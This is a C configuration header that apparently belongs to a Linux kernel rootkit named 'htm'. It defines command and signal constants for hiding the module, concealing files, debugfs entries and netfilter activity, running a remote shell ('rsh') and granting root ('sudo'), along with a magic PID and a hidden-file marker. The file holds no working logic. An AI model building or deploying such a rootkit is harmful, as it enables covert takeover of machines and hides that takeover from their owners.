#ifndef CONFIG_H
#define CONFIG_H

#define HTM_MODULE_NAME "htm"

#define HTMCTL_CMD_HELP   "help"
#define HTMCTL_CMD_INFO   "info"
#define HTMCTL_CMD_LOAD   "load"
#define HTMCTL_CMD_UNLOAD "unload"

#define HTM_CMD_EXEC            "exec"
#define HTM_CMD_DISABLE_CDD     "disable-cdd"
#define HTM_CMD_DISABLE_DEBUGFS "disable-debugfs"
#define HTM_CMD_DISABLE_FS      "disable-fs"
#define HTM_CMD_DISABLE_NF      "disable-nf"
#define HTM_CMD_ENABLE_CDD      "enable-cdd"
#define HTM_CMD_ENABLE_DEBUGFS  "enable-debugfs"
#define HTM_CMD_ENABLE_FS       "enable-fs"
#define HTM_CMD_ENABLE_NF       "enable-nf"
#define HTM_CMD_HIDE_MODULE     "hide-module"
#define HTM_CMD_RSH             "rsh"
#define HTM_CMD_SHOW_MODULE     "show-module"
#define HTM_CMD_SUDO            "sudo"

#define HTM_PID 46692 // Feigerbaum's constant

#define HTM_SIG_DISABLE_CDD     1
#define HTM_SIG_DISABLE_DEBUGFS 2
#define HTM_SIG_DISABLE_FS      3
#define HTM_SIG_DISABLE_NF      4
#define HTM_SIG_ENABLE_CDD      5
#define HTM_SIG_ENABLE_DEBUGFS  6
#define HTM_SIG_ENABLE_FS       7
#define HTM_SIG_ENABLE_NF       8
#define HTM_SIG_HIDE_MODULE     9
#define HTM_SIG_SHOW_MODULE     10
#define HTM_SIG_STATUS          11
#define HTM_SIG_SUDO            12

#define HTM_FS_STRING ".haustorium"

#define HTM_CDD_NAME "htm"
#endif
